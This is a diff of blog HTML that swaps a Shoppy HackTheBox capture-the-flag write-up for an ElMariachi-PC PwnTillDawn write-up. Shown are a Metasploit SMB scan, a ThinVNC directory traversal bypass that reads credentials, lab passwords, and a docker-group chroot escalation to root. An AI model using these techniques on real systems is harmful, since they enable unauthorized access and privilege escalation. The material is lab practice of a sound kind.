-</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use auxiliary/scanner/smb/smb_version
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; use auxiliary/scanner/smb/smb_version
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> &gt; options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/scanner/smb/smb_version<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   RHOSTS                    yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/U
+</span></span><span class="line"><span class="cl">                                       sing-Metasploit
+</span></span><span class="line"><span class="cl">   THREADS  <span class="m">1</span>                yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.150.150.69
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.150.150.69
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.69:445     - SMB Detected <span class="o">(</span>versions:2, 3<span class="o">)</span> <span class="o">(</span>preferred dialect:SMB 3.1.1<span class="o">)</span> <span class="o">(</span>compression capabilities:<span class="o">)</span> <span class="o">(</span>encryption capabilities:AES-128-GCM<span class="o">)</span> <span class="o">(</span>signatures:optional<span class="o">)</span> <span class="o">(</span>guid:<span class="o">{</span>12ce29e0-f300-4650-b6a7-8851bc744142<span class="o">})</span> <span class="o">(</span>authentication domain:ELMARIACHI-PC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.69:        - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="usertxt">User.txt</h4>
+</div><blockquote>
+<p>SMB Detected (versions:2, 3)
+Authentication domain: ELMARIACHI-PC</p>
+</blockquote>
+<h4 id="smbclient">SmbClient</h4>
+<p>I think i will use the <strong>SmbClient</strong> tool to see if there are any shared resources.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat user.txt 
-</span></span><span class="line"><span class="cl">b43c5028ab833b5XXXXXXXXXXXXXX
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ smbclient -L //10.150.150.69 -N
+</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="privilage-escalation">Privilage Escalation</h2>
-<h3 id="sudo--l">Sudo -l</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -l
-</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> jaeger: 
-</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jaeger on shoppy:
-</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User jaeger may run the following commands on shoppy:
-</span></span><span class="line"><span class="cl">    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat /home/deploy/password-manager
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
-</span></span><span class="line"><span class="cl">Welcome to Josh password manager!
-</span></span><span class="line"><span class="cl">Please enter your master password: Sample
-</span></span><span class="line"><span class="cl">Access granted! Here is creds !
-</span></span><span class="line"><span class="cl">Deploy Creds :
-</span></span><span class="line"><span class="cl">username: deploy
-</span></span><span class="line"><span class="cl">password: Deploying@pp!
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh deploy@shoppy.htb 
-</span></span><span class="line"><span class="cl">deploy@shoppy.htb password: 
-</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
-</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
-</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-</span></span><span class="line"><span class="cl">permitted by applicable law.
-</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 06:04:57 <span class="m">2022</span> from 10.10.14.38
-</span></span><span class="line"><span class="cl">$ id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>daemon<span class="o">)</span>,2<span class="o">(</span>bin<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>uucp<span class="o">)</span>,11,20<span class="o">(</span>dialout<span class="o">)</span>,26<span class="o">(</span>tape<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>
-</span></span><span class="line"><span class="cl">$ cat root.txt
-</span></span><span class="line"><span class="cl">e65b2ace8ff78062XXXXXXXXXXXX
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><em>Pwned</em>
-<img src="/post/Shoppy_HTB/imgs/Shoppy/1.png"
+</div><p>Looks like it is prohibted to access those shares.</p>
+<h3 id="port-60000-enumeration">Port 60000 Enumeration</h3>
+<p>So, I think this port is related to HTTP services as we can see from the output of <strong>nmap scanning</strong>.</p>
+<p>Let&rsquo;s open the browser see what is up there?</p>
+<p><img src="/post/El-Mariachi_PwnTillDawn/imgs/1.JPG"
 	
 	
 	
 	loading="lazy"
 	
-		alt="pwned"
+		alt="web"
+	
+	
+></p>
+<p>Also, From the nmap scanning i have found:</p>
+<blockquote>
+<p>WWW-Authenticate: Digest realm=&quot;<strong>ThinVNC</strong>&quot;, qop=&ldquo;auth&rdquo;, nonce=&ldquo;Bh5opIvq5UDI4UcCi+rlQA==&rdquo;,</p>
+</blockquote>
+<p>ThinVNC is <strong>a web remote access client (browser-based, HTML5)</strong>. It&rsquo;s an improved version of the standard VNC protocol.</p>
+<p>Let&rsquo;s see if there are any exploits or default credientials for this software.</p>
+<p>I have found this <a class="link" href="https://redteamzone.com/ThinVNC/"  target="_blank" rel="noopener"
+    >Article</a> which explains how to bypass the authentication of <strong>ThinVNC</strong> software.</p>
+<p>Let&rsquo;s do this step by step:</p>
+<ol>
+<li>
+<p>Open Burpsuite and intercept the signing in process.</p>
+</li>
+<li>
+<p>Change the URL to this path <code>/admin/../../ThinVnc.ini</code> to navigate to the default credientials (authentication) page.</p>
+</li>
+</ol>
+<p><img src="/post/El-Mariachi_PwnTillDawn/imgs/2.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="directory_traversal"
+	
+	
+></p>
+<ol start="3">
+<li>Sign in using the <strong>Username</strong> and <strong>Password</strong> resulted from the <strong>directory traversal</strong> attack.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User=desperado
+</span></span><span class="line"><span class="cl">Password=TooComplicatedToGuessMeAhahahahahahahh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/El-Mariachi_PwnTillDawn/imgs/3.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="sign_in"
+	
+	
+></p>
+<ol start="4">
+<li>Now, We can connect to the victim machine remotely.</li>
+</ol>
+<p><img src="/post/El-Mariachi_PwnTillDawn/imgs/4.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="remote"
+	
+	
+></p>
+<ol start="5">
+<li>We can navigate using <strong>File Explorer</strong> and get the <em>Flag</em>.</li>
+</ol>
+<p><img src="/post/El-Mariachi_PwnTillDawn/imgs/5.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="get_flag"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">FLAG67 = 2971f3459fe55db1237aadXXXXXXXXXXXXXXXX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Pwned</em></p>
+<p><img src="/post/El-Mariachi_PwnTillDawn/imgs/6.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Pwned"
 	
 	
 ></p>
@@ -750,7 +776,7 @@ LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duratio
     
     <section class="article-tags">
         
-            <a href="/tags/hackthebox/">HackTheBox</a>
+            <a href="/tags/pwntilldawn/">PwnTillDawn</a>
         
             <a href="/tags/pentesting/">PenTesting</a>
         
@@ -830,18 +856,18 @@ LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duratio
             
                 
 <article class="has-image">
-    <a href="/p/elmariachi-pc-pwntilldawn-writeup/">
+    <a href="/p/shoppy-htb-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG"/>
+                    <img src="/post/Shoppy_HTB/shoppy_htb.png" loading="lazy" data-key="" data-hash="/post/Shoppy_HTB/shoppy_htb.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">ElMariachi-PC PwnTillDawn Writeup</h2>
+            <h2 class="article-title">Shoppy HTB Writeup</h2>
         </div>
     </a>
 </article>
@@ -1034,27 +1060,21 @@ LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duratio
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#target-information">Target Information</a></li>
+    <li><a href="#scanning">Scanning</a>
+      <ol>
+        <li><a href="#nmap-scanning">Nmap Scanning</a></li>
+      </ol>
+    </li>
     <li><a href="#enumeration">Enumeration</a>
       <ol>
-        <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
-        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
-      </ol>
-    </li>
-    <li><a href="#exploitation">Exploitation</a>
-      <ol>
-        <li><a href="#nosql-injection">NoSQL Injection</a></li>
-        <li><a href="#hash-decryption">Hash Decryption</a></li>
-        <li><a href="#ssh-reverse-shell">SSH Reverse shell</a>
+        <li><a href="#smb-enumeration">SMB Enumeration</a>
           <ol>
-            <li><a href="#usertxt">User.txt</a></li>
+            <li><a href="#metasploit">Metasploit</a></li>
+            <li><a href="#smbclient">SmbClient</a></li>
           </ol>
         </li>
-      </ol>
-    </li>
-    <li><a href="#privilage-escalation">Privilage Escalation</a>
-      <ol>
-        <li><a href="#sudo--l">Sudo -l</a></li>
+        <li><a href="#port-60000-enumeration">Port 60000 Enumeration</a></li>
       </ol>
     </li>
   </ol>
